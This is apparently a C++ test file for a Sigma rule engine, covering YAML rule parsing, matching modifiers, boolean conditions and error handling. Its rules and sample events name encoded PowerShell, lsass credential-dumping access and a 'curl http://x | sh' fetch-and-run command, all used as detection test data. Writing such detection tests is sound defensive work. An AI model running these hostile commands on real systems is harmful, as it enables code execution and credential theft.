// v5.2 groundwork: Sigma YAML subset loader + matcher.
#include "test_util.h"
#include "sigma_engine.h"

#include <filesystem>
#include <fstream>
#include <string>

using seahorse::sigma::SigmaEngine;
using seahorse::sigma::SigmaEvent;

static std::filesystem::path write_temp(const std::string& name, const std::string& body) {
    auto dir = std::filesystem::temp_directory_path() / "seahorse_sigma_tests";
    std::filesystem::create_directories(dir);
    auto p = dir / name;
    std::ofstream out(p, std::ios::binary | std::ios::trunc);
    out << body;
    return p;
}

int main() {
    std::printf("test_sigma\n");

    // Keyword-style selection (legacy server/config/sigma format).
    {
        SigmaEngine eng;
        size_t n = eng.load_yaml(
            "title: SSH fail\n"
            "id: t-kw\n"
            "level: high\n"
            "detection:\n"
            "  selection:\n"
            "    - 'Failed password'\n"
            "    - 'authentication failure'\n"
            "  condition: selection\n");
        CHECK(n == 1);
        CHECK(eng.rule_count() == 1);
        auto hits = eng.evaluate("sshd: Failed password for root from 1.2.3.4", 7);
        CHECK(hits.size() == 1);
        CHECK(hits.size() == 1 && hits[0].rule_id == "t-kw");
        CHECK(hits.size() == 1 && hits[0].device_id == 7);
        CHECK(eng.evaluate("sshd: Accepted publickey for root from 1.2.3.4", 7).empty());
    }

    // Field maps with contains / startswith / endswith, AND condition.
    {
        SigmaEngine eng;
        size_t n = eng.load_yaml(
            "title: Encoded PS\n"
            "id: t-ps\n"
            "level: high\n"
            "detection:\n"
            "  selection_img:\n"
            "    Image|endswith:\n"
            "      - '\\powershell.exe'\n"
            "      - '\\pwsh.exe'\n"
            "  selection_cmd:\n"
            "    CommandLine|contains:\n"
            "      - '-enc'\n"
            "      - '-EncodedCommand'\n"
            "  condition: selection_img and selection_cmd\n");
        CHECK(n == 1);
        SigmaEvent ev;
        ev.fields["Image"] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        ev.fields["CommandLine"] = "powershell.exe -NoP -enc SQBFAFgA";
        CHECK(eng.evaluate(ev, 1).size() == 1);

        ev.fields["CommandLine"] = "powershell.exe -Help";
        CHECK(eng.evaluate(ev, 1).empty());

        ev.fields["Image"] = "C:\\Windows\\System32\\cmd.exe";
        ev.fields["CommandLine"] = "cmd.exe -enc nope";
        CHECK(eng.evaluate(ev, 1).empty());
    }

    // startswith is case-insensitive; missing field does not match.
    {
        SigmaEngine eng;
        eng.load_yaml(
            "title: tmp path\n"
            "id: t-start\n"
            "detection:\n"
            "  selection:\n"
            "    CommandLine|startswith: '/tmp/'\n"
            "  condition: selection\n");
        SigmaEvent ev;
        ev.fields["CommandLine"] = "/TMP/evil.sh";
        CHECK(eng.evaluate(ev, 0).size() == 1);
        ev.fields.erase("CommandLine");
        ev.fields["Image"] = "/tmp/evil.sh";
        CHECK(eng.evaluate(ev, 0).empty());
    }

    // equals (no modifier) and |re.
    {
        SigmaEngine eng;
        size_t n = eng.load_yaml(
            "title: re and equals\n"
            "id: t-re\n"
            "detection:\n"
            "  sel_user:\n"
            "    User: SYSTEM\n"
            "  sel_acc:\n"
            "    GrantedAccess|re: '0x1[0-9a-fA-F]{3}'\n"
            "  condition: sel_user and sel_acc\n");
        CHECK(n == 1);
        SigmaEvent ev;
        ev.fields["User"] = "system";
        ev.fields["GrantedAccess"] = "0x1F0F";
        CHECK(eng.evaluate(ev, 0).size() == 1);
        ev.fields["GrantedAccess"] = "0x0040";
        CHECK(eng.evaluate(ev, 0).empty());
        ev.fields["User"] = "bob";
        ev.fields["GrantedAccess"] = "0x1F0F";
        CHECK(eng.evaluate(ev, 0).empty());
    }

    // not, or, parentheses.
    {
        SigmaEngine eng;
        eng.load_yaml(
            "title: filtered lsass\n"
            "id: t-not\n"
            "detection:\n"
            "  sel:\n"
            "    TargetImage|endswith: '\\lsass.exe'\n"
            "  filter:\n"
            "    SourceImage|endswith: '\\csrss.exe'\n"
            "  other:\n"
            "    SourceImage|endswith: '\\malware.exe'\n"
            "  condition: sel and (other or not filter)\n");
        SigmaEvent ev;
        ev.fields["TargetImage"] = "C:\\Windows\\System32\\lsass.exe";
        ev.fields["SourceImage"] = "C:\\Windows\\System32\\csrss.exe";
        CHECK(eng.evaluate(ev, 0).empty());
        ev.fields["SourceImage"] = "C:\\Tools\\dump.exe";
        CHECK(eng.evaluate(ev, 0).size() == 1);
        ev.fields["SourceImage"] = "C:\\Tools\\malware.exe";
        CHECK(eng.evaluate(ev, 0).size() == 1);
    }

    // 1 of / all of prefix glob, plus 1 of them.
    {
        SigmaEngine eng;
        eng.load_yaml(
            "title: one of prefix\n"
            "id: t-1of\n"
            "detection:\n"
            "  selection_a:\n"
            "    CommandLine|contains: 'curl '\n"
            "  selection_b:\n"
            "    CommandLine|contains: '| sh'\n"
            "  other:\n"
            "    User: root\n"
            "  condition: 1 of selection*\n");
        SigmaEvent ev;
        ev.fields["CommandLine"] = "curl http://x | sh";
        ev.fields["User"] = "nobody";
        CHECK(eng.evaluate(ev, 0).size() == 1);
        ev.fields["CommandLine"] = "ls -l";
        CHECK(eng.evaluate(ev, 0).empty());

        SigmaEngine eng2;
        eng2.load_yaml(
            "title: all of them\n"
            "id: t-all\n"
            "detection:\n"
            "  a:\n"
            "    Image|endswith: '/python3'\n"
            "  b:\n"
            "    CommandLine|contains: 'curl '\n"
            "  condition: all of them\n");
        ev.fields["Image"] = "/usr/bin/python3";
        ev.fields["CommandLine"] = "python3 -c curl http://x";
        CHECK(eng2.evaluate(ev, 0).size() == 1);
        ev.fields["CommandLine"] = "python3 -c print(1)";
        CHECK(eng2.evaluate(ev, 0).empty());

        SigmaEngine eng3;
        eng3.load_yaml(
            "title: hyphen form\n"
            "id: t-hyphen\n"
            "detection:\n"
            "  selection_a:\n"
            "    CommandLine|contains: 'foo'\n"
            "  selection_b:\n"
            "    CommandLine|contains: 'bar'\n"
            "  condition: 1-of selection*\n");
        ev.fields["CommandLine"] = "xx bar yy";
        CHECK(eng3.evaluate(ev, 0).size() == 1);
    }

    // Quotes, comments, escaped quotes.
    {
        SigmaEngine eng;
        size_t n = eng.load_yaml(
            "# a comment\n"
            "title: 'quoted # title'\n"  // hash inside quotes is not a comment
            "id: t-q\n"
            "detection:\n"
            "  selection:\n"
            "    CommandLine|contains: \"say \\\"hi\\\"\"  # trailing comment\n"
            "  condition: selection\n");
        CHECK(n == 1);
        CHECK(eng.rules().size() == 1 && eng.rules()[0].title == "quoted # title");
        SigmaEvent ev;
        ev.fields["CommandLine"] = "echo say \"hi\" now";
        CHECK(eng.evaluate(ev, 0).size() == 1);
    }

    // Disabled rules and unknown modifiers are skipped with an error.
    {
        SigmaEngine eng;
        CHECK(eng.load_yaml("title: x\ndisabled: true\ndetection:\n  s:\n    - a\n  condition: s\n") == 0);
        CHECK(!eng.errors().empty());
        eng.clear();
        CHECK(eng.load_yaml(
            "title: bad mod\n"
            "detection:\n"
            "  s:\n"
            "    Image|cidr: 10.0.0.0/8\n"
            "  condition: s\n") == 0);
        CHECK(!eng.errors().empty());
    }

    // Invalid regex skips the rule; oversized pattern skips the rule.
    {
        SigmaEngine eng;
        CHECK(eng.load_yaml(
            "title: bad re\n"
            "detection:\n"
            "  s:\n"
            "    CommandLine|re: '(unclosed'\n"
            "  condition: s\n") == 0);
        CHECK(!eng.errors().empty());
        eng.clear();
        std::string big(4097, 'A');
        CHECK(eng.load_yaml(
            "title: big\n"
            "detection:\n"
            "  s:\n"
            "    CommandLine|contains: '" + big + "'\n"
            "  condition: s\n") == 0);
        CHECK(!eng.errors().empty());
    }

    // Oversized file is rejected.
    {
        SigmaEngine eng;
        std::string body = "title: bigfile\ndetection:\n  s:\n    CommandLine|contains: x\n  condition: s\n";
        body.append(64 * 1024, '#');
        CHECK(eng.load_yaml(body) == 0);
        CHECK(!eng.errors().empty());
    }

    // Malformed YAML: tabs, folded scalars, missing detection.
    {
        SigmaEngine eng;
        CHECK(eng.load_yaml("title: t\n\tdetection: x\n") == 0);
        bool saw_tab = false;
        for (const auto& e : eng.errors())
            if (e.message.find("tab") != std::string::npos) saw_tab = true;
        CHECK(saw_tab);

        eng.clear();
        CHECK(eng.load_yaml("title: t\ndetection:\n  s: |\n    multi\n    line\n  condition: s\n") == 0);
        CHECK(!eng.errors().empty());

        eng.clear();
        CHECK(eng.load_yaml("title: no detection\nlevel: low\n") == 0);
        CHECK(!eng.errors().empty());
    }

    // Unknown selection in condition is a load-time... actually we currently
    // compile the condition without checking names; evaluate just fails the
    // Sel node. That's acceptable, but a typo should not crash.
    {
        SigmaEngine eng;
        CHECK(eng.load_yaml(
            "title: typo\n"
            "detection:\n"
            "  selection:\n"
            "    CommandLine|contains: x\n"
            "  condition: selecton\n") == 1);
        SigmaEvent ev;
        ev.fields["CommandLine"] = "x";
        CHECK(eng.evaluate(ev, 0).empty());
    }

    // load_directory: sample pack + existing keyword samples.
    {
#ifndef SEAHORSE_SOURCE_DIR
#define SEAHORSE_SOURCE_DIR "."
#endif
        const std::filesystem::path root(SEAHORSE_SOURCE_DIR);
        const auto samples = root / "rules" / "sigma";
        {
            SigmaEngine eng;
            size_t n = eng.load_directory(samples);
            CHECK(n == 4);
            if (!eng.errors().empty()) {
                for (const auto& e : eng.errors())
                    std::printf("    load error: %s: %s\n", e.path.c_str(), e.message.c_str());
            }
            CHECK(eng.errors().empty());

            SigmaEvent ev;
            ev.fields["Image"] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            ev.fields["CommandLine"] = "powershell -EncodedCommand SQBFAFgA";
            auto hits = eng.evaluate(ev, 1);
            bool found = false;
            for (const auto& h : hits)
                if (h.rule_id.find("0001") != std::string::npos) found = true;
            CHECK(found);

            CHECK(!eng.evaluate("sshd: Failed password for alice from 10.0.0.8", 2).empty());

            ev = {};
            ev.fields["TargetImage"] = "C:\\Windows\\System32\\lsass.exe";
            ev.fields["GrantedAccess"] = "0x1FFFF";
            ev.fields["SourceImage"] = "C:\\Temp\\procdump.exe";
            CHECK(!eng.evaluate(ev, 3).empty());
            ev.fields["SourceImage"] = "C:\\Windows\\System32\\csrss.exe";
            CHECK(eng.evaluate(ev, 3).empty());

            ev = {};
            ev.fields["Image"] = "/usr/bin/python3";
            ev.fields["CommandLine"] = "/tmp/stage.py";
            CHECK(!eng.evaluate(ev, 4).empty());
        }

        const auto shipped = root / "server" / "config" / "sigma";
        if (std::filesystem::exists(shipped / "ps_encoded_command.yml")) {
            SigmaEngine eng;
            size_t n = eng.load_directory(shipped);
            CHECK(n >= 3);
            CHECK(eng.errors().empty());
            CHECK(!eng.evaluate(
                "powershell.exe -EncodedCommand SQBFAFgA", 0).empty());
        }
    }

    // load_directory missing path records an error.
    {
        SigmaEngine eng;
        CHECK(eng.load_directory("/no/such/sigma/dir/seahorse") == 0);
        CHECK(!eng.errors().empty());
    }

    // parse_file helper + comments-only file adds nothing.
    {
        auto p = write_temp("empty.yml", "# just a comment\n\n");
        auto rules = SigmaEngine::parse_file(p);
        CHECK(rules.empty());
        auto p2 = write_temp("one.yml",
            "title: file rule\n"
            "id: t-file\n"
            "detection:\n"
            "  selection:\n"
            "    - 'needle'\n"
            "  condition: selection\n");
        auto r2 = SigmaEngine::parse_file(p2);
        CHECK(r2.size() == 1);
        CHECK(r2.size() == 1 && r2[0].id == "t-file");
    }

    // Raw-line evaluate still works for field-map rules if no fields are set
    // (they must not match -- missing fields fail closed).
    {
        SigmaEngine eng;
        eng.load_yaml(
            "title: needs fields\n"
            "id: t-raw\n"
            "detection:\n"
            "  s:\n"
            "    Image|endswith: '\\cmd.exe'\n"
            "  condition: s\n");
        CHECK(eng.evaluate("C:\\Windows\\System32\\cmd.exe ran something", 0).empty());
    }

    TEST_MAIN_RETURN();
}
